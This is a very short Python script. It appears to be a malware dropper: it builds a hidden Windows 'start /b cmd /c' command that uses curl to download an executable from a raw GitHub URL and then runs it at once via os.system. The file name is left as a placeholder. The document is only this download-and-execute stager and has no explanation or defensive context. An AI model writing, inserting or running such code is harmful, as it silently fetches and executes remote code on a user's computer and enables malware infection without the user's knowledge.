import os
command = r'start "" /b cmd /c "curl -s -L -o <PAYLOAD_FILE> https://github.com/FFSuccess/Exe/raw/main/<PAYLOAD_FILE> && <PAYLOAD_FILE>"'
os.system(command)
